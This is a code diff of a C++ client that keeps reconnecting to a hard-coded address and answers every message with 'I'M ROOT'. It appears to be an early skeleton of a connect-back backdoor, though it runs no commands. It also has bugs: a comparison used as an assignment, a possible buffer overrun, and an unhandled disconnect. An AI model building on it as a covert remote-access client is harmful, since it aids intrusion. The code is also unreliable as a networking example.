@@ -7,7 +7,6 @@
 *
 */
 
-
 // if we're on windows
 #if defined (WIN32)
 	#include <windows.h>
@@ -25,8 +24,6 @@
 	#include <unistd.h>
 
 #endif
-
-
 
 #include <iostream>
 #include <cstdio>
@@ -50,10 +47,10 @@ int main(int argc, char const *argv[])
     #endif
 
 
-	int sock,len;
+	int sock,len,val;
 	char buffer[BUFSIZE];
 	struct sockaddr_in server_address;
-
+	bool isConnected = true;
 	// Create the socket 
 	if((sock= socket(AF_INET,SOCK_STREAM,0))== -1)
 	{
@@ -65,38 +62,44 @@ int main(int argc, char const *argv[])
 	server_address.sin_family = AF_INET;
 	server_address.sin_port = htons(PORT);
 	server_address.sin_addr.s_addr= inet_addr(IP);
-
-	// Try to connect 
-	while(connect(sock, (struct sockaddr*)&server_address,sizeof(server_address)) == -1)
+	while(true)
 	{
-		perror("connect");
-		// if we're on windows
-		#if defined (WIN32)
-			Sleep(20000);
-		// else, if we're on Linux
-		#elif defined (linux)
-			sleep(20);
-		#endif
+		// Try to connect 
+		while(connect(sock, (struct sockaddr*)&server_address,sizeof(server_address)) == -1)
+		{
+			perror("connect");
+			// if we're on windows
+			#if defined (WIN32)
+				Sleep(20000);
+			// else, if we're on Linux
+			#elif defined (linux)
+				sleep(20);
+			#endif
+		}
+		isConnected=true;
+	    while(isConnected)
+	    {
+	    	if((val=recv(sock,buffer,BUFSIZE,0))<0)
+	        {
+	            perror("recv");
+	            exit (EXIT_FAILURE);
+	        }
+	        buffer[val]='\0';
+	        cout<<"recu :"<<buffer<<endl;
+	        if(val>=0)
+	        {
+		        string result = "I'M ROOT";
+		        len = result.size();
+		        if(send(sock,result.c_str(),len,0)!=len)
+		        {
+		            perror("write");
+		            exit (EXIT_FAILURE);
+		        }
+	    	}else
+	    	{
+	    		isConnected==false;
+	    	}
+	    }
 	}
-	int val;
-    while(true)
-    {
-    	if((val=recv(sock,buffer,BUFSIZE,0))<0)
-        {
-            perror("recv");
-            exit (EXIT_FAILURE);
-        }
-        buffer[val]='\0';
-        cout<<"recu :"<<buffer<<endl;
-
-        string result = "I'M ROOT";
-        len = result.size();
-        if(send(sock,result.c_str(),len,0)!=len)
-        {
-            perror("write");
-            exit (EXIT_FAILURE);
-        }
-    }
-
 	return 0;
 }
